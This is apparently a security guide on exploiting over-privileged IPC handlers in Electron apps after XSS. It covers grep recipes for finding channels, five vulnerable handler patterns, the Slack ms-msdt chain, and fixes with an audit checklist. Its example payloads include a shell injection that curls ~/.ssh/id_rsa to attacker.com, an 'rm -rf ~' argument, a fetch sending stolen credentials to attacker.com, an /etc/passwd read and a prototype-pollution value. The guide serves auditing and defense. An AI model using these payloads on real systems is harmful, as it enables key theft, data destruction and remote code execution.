---
title: IPC Injection
description: Exploiting over-privileged IPC handlers in Electron — the most common post-XSS escalation technique
---

# IPC Injection

If you've found XSS in an Electron app and you're asking "what do I do with it" — IPC injection is usually the answer. It's the bridge between renderer compromise and main process impact. The XSS gives you code execution in the sandboxed renderer. IPC injection turns that into code execution in the unsandboxed main process.

Understanding why this works requires one key insight: when contextBridge validation exists in the preload, a post-XSS attacker doesn't use the preload. They call `ipcRenderer.invoke('channel-name', args)` directly, skipping straight to the main process. The preload's validation is irrelevant. The main process handler is the only place validation actually counts.

---

## The Basic Chain

```
XSS fires in renderer
      │
      │  ipcRenderer.invoke('dangerous-channel', 'calc.exe')
      │  (skips preload validation entirely)
      ▼
ipcMain.handle('dangerous-channel', async (event, cmd) => {
      │
      │  exec(cmd)  ← no sender check, no arg validation
      ▼
calc.exe opens
```

Two lines of attacker code. Two lines that work on every Electron app where a privileged handler exists without input validation.

---

## Finding the Channels

You're looking for two things: what handlers exist, and which ones do something dangerous with renderer input.

```bash
# Step 1 — list all main process handlers:
grep -rn "ipcMain\.\(on\|handle\|once\)(" \
  --include="*.js" . | grep -v node_modules | sort

# Step 2 — find handlers calling dangerous operations:
grep -rn "ipcMain\.\(on\|handle\)" --include="*.js" . -A 15 | \
  grep -E "exec\b|spawn\b|eval\b|openExternal|writeFileSync|writeFile\s*\(|readFile|require\s*\(" | \
  grep -v node_modules

# Step 3 — find the bridge (what the renderer can call):
grep -rn "exposeInMainWorld" --include="*.js" . -A 25 | \
  grep "ipcRenderer\.\(invoke\|send\)" | grep -v node_modules
```

The intersection of "handlers doing dangerous things" and "handlers reachable from renderer" is your target list.

---

## The Five Patterns That Show Up in Real Bugs

### Pattern 1: Shell Command with Renderer Input

The most obvious. `exec()` with template literals containing renderer-controlled variables:

```javascript
// main.js:
ipcMain.handle('run-converter', async (event, inputPath, outputFormat) => {
  const cmd = `ffmpeg -i "${inputPath}" -f ${outputFormat} output.tmp`;
  return exec(cmd);
  
  // inputPath = '"; curl https://attacker.com/$(cat ~/.ssh/id_rsa); echo "'
  // outputFormat = 'mp3; rm -rf ~'
  
  // Both are direct shell injection — the template literal makes it obvious to grep for
});
```

Grep for `exec(` and look for nearby template literals containing variables. Any variable in that exec call is worth tracing to its source.

### Pattern 2: Dynamic require() on Renderer-Provided Path

```javascript
// main.js:
ipcMain.handle('load-plugin', async (event, pluginName) => {
  const plugin = require(path.join(PLUGINS_DIR, pluginName));
  return plugin.init();
  
  // pluginName = '../../main'      → loads app's main.js
  // pluginName = '../malicious'    → path traversal → arbitrary module load
  // If plugin dir is user-writable: drop malicious .js → call this handler
});
```

### Pattern 3: Credential Handler with No Sender Check

This one doesn't give you exec — it gives you credentials, which is still reportable:

```javascript
// main.js — no check on who's asking:
ipcMain.handle('get-api-credentials', async (event) => {
  return {
    apiKey: secrets.STRIPE_SECRET_KEY,
    dbPassword: secrets.DATABASE_PASSWORD
  };
});

// Post-XSS:
// const creds = await ipcRenderer.invoke('get-api-credentials');
// fetch('https://attacker.com/?k=' + JSON.stringify(creds));
```

Any renderer — not just the app's own page, but any content the renderer ends up loading — can call this. The credentials travel to the attacker.

### Pattern 4: The Generic Relay Bridge

```javascript
// preload.js — exposes the entire IPC surface:
contextBridge.exposeInMainWorld('ipc', {
  call: (channel, ...args) => ipcRenderer.invoke(channel, ...args)
});

// Post-XSS, in renderer:
// Enumerate what channels are registered:
// window.ipc.call('exec-command', 'calc.exe')
// window.ipc.call('read-file', '/etc/passwd')
// window.ipc.call('shell-open', 'ms-msdt://...')
```

This pattern means every registered ipcMain handler is callable from the renderer. The bridge is doing nothing useful from a security standpoint.

### Pattern 5: Prototype Pollution to Auth Bypass

```javascript
// main.js:
ipcMain.on('update-settings', (event, updates) => {
  Object.assign(appConfig, updates);
  // updates = { "__proto__": { "isAdmin": true } }
  // Object.prototype.isAdmin = true in main process
});

// Later in main process:
if (request.isAdmin) {      // evaluates true for all objects — the {} object has isAdmin: true
  grantPrivilegedAccess();
}
```

---

## The Slack Zero-Click (Template)

Oskars Vegeris's Slack chain is the canonical example:

1. **XSS** — workspace name rendered without sanitization, fires in every connecting client
2. **Bridge** — Slack preload exposed `openURL` which invoked `'open-url'` channel
3. **Handler** — main process called `shell.openExternal(url)` without URL scheme validation
4. **OS** — `ms-msdt://` protocol handled by Windows → RCE

The lesson isn't "don't use Slack." It's: *every Electron collaboration app has all three pieces.* Workspace metadata rendered in the UI. A link-opening mechanism. An IPC bridge connecting them. Find the XSS in the metadata, find the `openExternal` path, win the bug.

---

## Fixing IPC Handlers

The fix always requires validation in the ipcMain handler — not in the preload (skippable), not in the renderer (attacker-controlled):

```javascript
// Validate sender first:
function validateSender(event) {
  const url = event.senderFrame?.url || event.sender?.getURL() || '';
  const expected = 'file://' + path.join(app.getAppPath(), 'index.html');
  if (url !== expected) throw new Error(`Untrusted sender: ${url}`);
}

// Validate arguments:
ipcMain.handle('run-conversion', async (event, inputPath, format) => {
  validateSender(event);

  // Allowlist — don't denylist:
  const ALLOWED_FORMATS = ['mp3', 'mp4', 'ogg', 'webm'];
  if (!ALLOWED_FORMATS.includes(format)) throw new Error('Unknown format');

  // Path validation:
  const safeBase = path.resolve(app.getPath('userData'), 'uploads');
  const safePath = path.resolve(safeBase, inputPath);
  if (!safePath.startsWith(safeBase + path.sep)) throw new Error('Path traversal');

  // Now safe to use — no shell template literal:
  return spawnSync('ffmpeg', ['-i', safePath, '-f', format, 'output.tmp']);
  //                ↑ array args, not shell string — no injection possible
});
```

---

## IPC Audit Checklist

Every handler needs to pass all of these:

- [ ] `event.senderFrame.url` or `event.sender.getURL()` is validated
- [ ] All renderer-supplied arguments are type-checked
- [ ] Paths are validated with `path.resolve` + `startsWith` (not just `path.join`)
- [ ] URLs are validated with `new URL()` + protocol allowlist
- [ ] No shell string concatenation (use array args to spawn)
- [ ] Returned data doesn't include secrets not needed by the renderer

Every contextBridge exposure needs:

- [ ] No `(channel, ...args) => ipcRenderer.invoke(channel, ...args)` relay
- [ ] Explicit argument validation before invoking IPC
- [ ] No direct `ipcRenderer` object exposure
